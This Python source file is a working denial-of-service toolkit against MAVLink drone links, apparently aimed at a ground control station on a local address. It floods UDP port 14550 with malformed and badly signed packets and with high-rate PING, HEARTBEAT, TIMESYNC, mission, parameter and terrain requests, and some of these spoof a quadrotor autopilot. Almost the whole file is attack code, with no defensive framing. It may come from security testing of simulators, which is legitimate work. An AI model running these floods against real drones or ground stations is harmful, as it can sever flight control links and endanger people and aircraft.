# flood_mavlink_link.py
import os
import socket
import threading
os.environ['MAVLINK20'] = '1'
from pymavlink import mavutil
import time
import sys
import time


def passphrase_to_key(passphrase):
        '''convert a passphrase to a 32 byte key'''
        import hashlib
        h = hashlib.new('sha256')
        if sys.version_info[0] >= 3:
            passphrase = passphrase.encode('ascii')
        h.update(passphrase)
        return h.digest()

def get_signing_timestamp():
        '''get a timestamp from current clock in units for signing'''
        epoch_offset = 1420070400
        now = max(time.time(), epoch_offset)
        return int((now - epoch_offset)*1e5)

def upload_signing_key_to_drone(master, passphrase):
    """
    Uses MAVLink Message #256 (SETUP_SIGNING) to upload the key.
    """
   
    digest = passphrase_to_key(passphrase)
    secret_key = []
    for b in digest:
        if sys.version_info[0] >= 3:
            secret_key.append(b)
        else:
            secret_key.append(ord(b))
    # 2. Setup the initial timestamp (Required by Message #256)
    # MAVLink timestamps are usually 100-microsecond units since 1/1/2015
    initial_timestamp = get_signing_timestamp()

    print(f"Sending SETUP_SIGNING (#256) for key: {passphrase}")

    # 3. Use the generated helper for Message #256
    # Arguments: target_system, target_component, secret_key (list), initial_timestamp
    master.mav.setup_signing_send(master.target_system, master.target_component,
                                           secret_key, initial_timestamp)

    # Assuming 'digest' is what you got from passphrase_to_key()
    
    # Give the SITL a moment to process and save to eeprom.bin
    time.sleep(1)


def setup_packet_signing(master, timestamp=None):
     # 4. Enable signing locally so pymavlink starts signing the NEXT messages
     # allow_unsigned_callback=lambda mav, msgId: True
    master.setup_signing(passphrase_to_key("wrongpassword"), sign_outgoing=True, initial_timestamp = timestamp)

def nav_flood(ip="192.168.13.14", port=14550, stop_event=None, interval=0.001, duration=60, execution_record=None):
    if execution_record:
        execution_record["arguments"] = {
            "ip": ip,
            "port": port,
            "interval": interval,
            "duration": duration
    }
    master = mavutil.mavlink_connection(f'udpout:{ip}:{port}', source_system=2, source_component=2)
    # Must wait for first heartbeat to know target_system/target_component
    print(f"Connected to System {master.target_system}")
    setup_packet_signing(master)
    while not stop_event or not stop_event.is_set():
        master.mav.nav_controller_output_send(
            0.0,   # nav_roll
            0.0,   # nav_pitch
            0,     # nav_bearing
            0,     # target_bearing
            0,     # wp_dist
            0.0,   # alt_error
            0.0,   # aspd_error
            0.0    # xtrack_error
        )
        time.sleep(interval)



def socket_flood(ip="192.168.13.14", port=14550, stop_event=None ,payload=b"", size=0, interval=0.0001, duration=60, execution_record=None):
    # payload = bytes.fromhex("fd1701008801013e0000bb71853ece3319bfc2f59aba00000000e55da33c54ffbde3e6017360f9cf6720bc6a4193a146") # NAV_CONTROLLER_OUTPUT with invalid signature
    payload = b"manglednonmavlinkpayload" # mangled payload invalid mavlink

    
    # payload = bytes.fromhex("fd 09 02 01 01 00 00 00 00 00 00 08 00 04 03 be a6 01 02 03 04 05 06 01 02 03 04 05 06 07") # heartbeat, wireshark doesnt show a signature
    # payload = bytes.fromhex("fd2b01009d010118000058517e280000000083a83216e9cafabab82202007900c80004009155060ab82202002c0100002c01000028a8c201d292b95f672070705b8d295a") # GPS_RAW_INT with bad signature, no effect, maybe getting dropped?
    # payload = bytes.fromhex("fd 1c 01 00 1c 01 01 1e 00 00 04 5a 0a 00 2a 65 2a bd f2 e1 eb 3c 0f ff 2c 40 36 79 e3 bf 4c 61 c1 3f 13 83 11 3d da ce 01 51 92 b9 5f 67 20 cd b1 7c 0c cd 32") # attitude message with bad signature, dont use, because it messes with the jitter logging
    # payload = bytes.fromhex("fe 09 02 01 01 00 00 00 00 00 00 08 00 04 03 be a6") # unsigned heartbeat -> works well when gcs accepts unsigned messages, but drops them when it doesnt
    if execution_record:
        execution_record["arguments"] = {
            "ip": ip,
            "port": port,
            "payload": payload.hex() if isinstance(payload, bytes) else payload,
            "size": size,
            "interval": interval,
            "duration": duration
        }
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    if size > 0:
        payload = payload * size

    # print(execution_record["arguments"])

    print(f"Flooding {ip}:{port} with {payload} packets every {interval}s...")
    while not stop_event or not stop_event.is_set():
        sock.sendto(payload, (ip, port))
        # time.sleep(interval)


def ping_flood(target_ip="192.168.13.14", target_port=14550, stop_event=None, rate_hz=1, execution_record=None):
    if execution_record is not None:
        execution_record["arguments"] = {
            "target_ip": target_ip,
            "target_port": target_port,
            "rate_hz": rate_hz
        }
    sock = mavutil.mavlink_connection(f'udpout:{target_ip}:{target_port}', source_system=2, source_component=2)
    print(f"Connected. Starting PING flood at {rate_hz} messages/sec...")

    interval = 1 / rate_hz
    seq = 0
    
    while not stop_event or not stop_event.is_set():
        try:
            # MAVLink PING message (ID #4)
            # time_usec: current system time in microseconds
            # seq: incrementing sequence number
            # target_system/component: 0 for a general ping request
            sock.mav.ping_send(
                int(time.time() * 1e6), # time_usec
                seq,                    # ping sequence number
                0,                      # target_system (0 = broadcast/request)
                0                       # target_component
            )
            
            seq = (seq + 1) % 256 # Keep sequence within 1-byte range if needed
            print(f"[+] Flooding PING (seq {seq})")
            
            time.sleep(interval)
        except Exception as e:
            print(f"Error sending: {e}")
            break

def heartbeat_flood(target_ip="192.168.13.14", target_port=14550, stop_event=None, rate_hz=1000, execution_record=None):
    if execution_record is not None:
        execution_record["arguments"] = {
            "target_ip": target_ip,
            "target_port": target_port,
            "rate_hz": rate_hz
        }
    mav = mavutil.mavlink.MAVLink(None)
    sock = mavutil.mavlink_connection(f'udpout:{target_ip}:{target_port}', source_system=2, source_component=2)
    # sock.wait_heartbeat()
    print(f"Connected. Starting flood at {rate_hz} messages/sec...")

    interval = 1 / rate_hz
    
    while not stop_event or not stop_event.is_set():
        try:
            msg = mav.heartbeat_encode(
                type=mavutil.mavlink.MAV_TYPE_GENERIC,
                autopilot=mavutil.mavlink.MAV_AUTOPILOT_INVALID,
                base_mode=0,
                custom_mode=0,
                system_status=mavutil.mavlink.MAV_STATE_ACTIVE
            )
            sock.mav.send(msg)
            print("[+] Flooding heartbeat")
            time.sleep(interval)
        except Exception:
            pass

def timesync_flood(target_ip="192.168.13.14", target_port=14550, stop_event=None, rate_hz=1, execution_record=None):
    if execution_record is not None:
        execution_record["arguments"] = {
            "target_ip": target_ip,
            "target_port": target_port,
            "rate_hz": rate_hz
        }
    sock = mavutil.mavlink_connection(f'udpout:{target_ip}:{target_port}', source_system=2, source_component=2)
    
    print(f"Connected. Starting TimeSync flood at {rate_hz} messages/sec...")
    interval = 1 / rate_hz
    
    while not stop_event or not stop_event.is_set():
        try:
            # TIMESYNC message (ID #111)
            # tc1: Time sync timestamp 1 (nanoseconds). 
            # When sending a request, ts1 is usually the current time and tc1 is 0.
            now_ns = int(time.time() * 1e9)
            
            sock.mav.timesync_send(
                tc1=0,          # Remote system sets this on reply
                ts1=now_ns      # Local system timestamp
            )

            sock.mav.heartbeat_send(
                mavutil.mavlink.MAV_TYPE_QUADROTOR,
                mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
                0, 0, 0
            )
            
            print(f"[+] Sent TimeSync request: {now_ns} ns")
            time.sleep(interval)
        except Exception as e:
            print(f"[-] Error: {e}")
            break


import time
from pymavlink import mavutil

def mission_flood(target_ip="192.168.13.14", target_port=14550, stop_event=None, rate_hz=200, execution_record=None):
    if execution_record is not None:
        execution_record["arguments"] = {
            "target_ip": target_ip,
            "target_port": target_port,
            "rate_hz": rate_hz
        }
    sock = mavutil.mavlink_connection(f'udpout:{target_ip}:{target_port}', source_system=2, source_component=2)
    
    print(f"Connected. Sending MISSION_REQUEST_INT at {rate_hz} Hz...")
    interval = 1 / rate_hz
    seq_counter = 0

    while not stop_event or not stop_event.is_set():
        try:
            # Heartbeat (Identifies itself as a Quadrotor to the GCS)
            sock.mav.heartbeat_send(
                mavutil.mavlink.MAV_TYPE_QUADROTOR,
                mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
                mavutil.mavlink.MAV_STATE_ACTIVE, 0, 0
            )
            # MISSION_REQUEST_INT (Message #385)
            # This is the drone asking the GCS for a specific waypoint
            sock.mav.mission_request_int_send(
                target_system=255,      # Typically 255 for GCS
                target_component=230,     # Component ID
                seq=seq_counter        # The index of the waypoint the drone wants
                # mission_type=mavutil.mavlink.MAV_MISSION_TYPE_MISSION
            )

            
            print(f"[+] Drone requested waypoint index: {seq_counter}")
            
            # Increment sequence to simulate "pulling" a full mission
            seq_counter += 1 
            time.sleep(interval)
            
        except Exception as e:
            print(f"[-] Error: {e}")
            break


def param_flood(target_ip="192.168.13.14", target_port=14550, stop_event=None, rate_hz=1, execution_record=None):
    """
    Floods the GCS with PARAM_REQUEST_LIST messages.
    Forces the GCS to parse requests and initiate a full parameter broadcast.
    """
    if execution_record is not None:
        execution_record["arguments"] = {
            "target_ip": target_ip,
            "target_port": target_port,
            "rate_hz": rate_hz
        }
    # Connect to the GCS. 
    # We identify as System 1 (the Autopilot) so the GCS thinks it needs to sync.
    sock = mavutil.mavlink_connection(
        f'udpout:{target_ip}:{target_port}', 
        source_system=2, 
        source_component=2
    )
    
    print(f"[!] Starting Parameter Request flood targeting {target_ip}:{target_port}")
    print(f"[!] Rate: {rate_hz} Hz")

    interval = 1 / rate_hz

    while not stop_event or not stop_event.is_set():
        try:
            # MAVLink PARAM_REQUEST_LIST (ID #21)
            # target_system: The ID of the GCS (usually 255 or 0 for broadcast)
            # target_component: Usually 0
            sock.mav.param_request_list_send(
                255, 
                230
            )
            
            # We also send a heartbeat to keep the "connection" alive in the GCS UI
            sock.mav.heartbeat_send(
                mavutil.mavlink.MAV_TYPE_QUADROTOR,
                mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
                0, 0, 0
            )

            time.sleep(interval)
            
        except Exception as e:
            print(f"[-] Flood Error: {e}")
            break

    print("[+] Parameter flood stopped.")


import time
from pymavlink import mavutil

def terrain_flood(target_ip="192.168.13.14", target_port=14550, stop_event=None, rate_hz=60, execution_record=None):
    if execution_record is not None:
        execution_record["arguments"] = {
            "target_ip": target_ip,
            "target_port": target_port,
            "rate_hz": rate_hz
        }
    # Establish connection (System 1, Component 1)
    sock = mavutil.mavlink_connection(f'udpout:{target_ip}:{target_port}', source_system=2, source_component=2)
    
    print(f"Connected. Starting Terrain Request flood at {rate_hz} Hz...")
    interval = 1 / rate_hz

    while not stop_event or not stop_event.is_set():
        try:
            # Coordinates must be in 1E7 format (same as MISSION_ITEM_INT)
            # Example: 47.3667, 8.5500
            lat_int = 473667000 
            lon_int = 85500000
            
            # bitmask: Which of the 8x4 blocks we are requesting (usually all bits set)
            mask = 0xFFFFFFFF 

            # TERRAIN_REQUEST (Message #133)
            sock.mav.terrain_request_send(
                lat=lat_int,
                lon=lon_int,
                grid_spacing=30,   # Meters (Standard SRTM spacing)
                mask=mask          # Bitmask of requested 4x4 blocks
            )

            # Essential: Send Heartbeat so GCS knows where to send the data back
            sock.mav.heartbeat_send(
                mavutil.mavlink.MAV_TYPE_QUADROTOR,
                mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
                mavutil.mavlink.MAV_STATE_ACTIVE, 0, 0
            )
            
            print(f"[+] Requested terrain data for: {lat_int}, {lon_int}")
            # time.sleep(interval)

        except Exception as e:
            print(f"[-] Error: {e}")
            break

# def mavlink_flood(target_ip="192.168.13.14", target_port=14550, rate_hz=1, threads=1, message="ping", duration=60, execution_record=None):
#     if execution_record:
#         execution_record["arguments"] = {
#             "target_ip": target_ip,
#             "target_port": target_port,
#             "rate_hz": rate_hz,
#             "threads": threads,
#             "duration": duration
#         }
#     print(f"Starting mavlink flood on {target_ip}:{target_port} with {rate_hz} Hz rate...")
#     stop_event = threading.Event()
#     thread_list = []
    
#     for _ in range(threads):
#         if message == "heartbeat":
#             t = threading.Thread(target=heartbeat_flood_worker, args=(target_ip, target_port, stop_event))
#         elif message == "param_request":
#             t = threading.Thread(target=param_flood_worker, args=(target_ip, target_port, stop_event))
#         elif message == "timesync_request":
#             t = threading.Thread(target=timesync_flood_worker, args=(target_ip, target_port, stop_event))
#         elif message == "mission_request":
#             t = threading.Thread(target=mission_request_worker, args=(target_ip, target_port, stop_event))
#         elif message == "terrain_request":
#             t = threading.Thread(target=terrain_flood_worker, args=(target_ip, target_port, stop_event))
#         else:
#             t = threading.Thread(target=ping_flood_worker, args=(target_ip, target_port, stop_event))
#         t.daemon = True
#         t.start()
#         thread_list.append(t)

#     time.sleep(duration)    
#     stop_event.set()
#     for t in thread_list:
#         t.join(timeout=1)
#     print("\nStopping flood.")

if __name__ == "__main__":
    # if len(sys.argv) != 3:
    #     print("Usage: python flood_mavlink_link.py <ip:port> <rate_hz>")
    #     sys.exit(1)
    socket_flood()
    # nav_flood()
    # ip, port = sys.argv[1].split(":")
    # flood_mavlink(ip, int(port), float(sys.argv[2]))
    # mavlink_flood(message="heartbeat", duration=30)
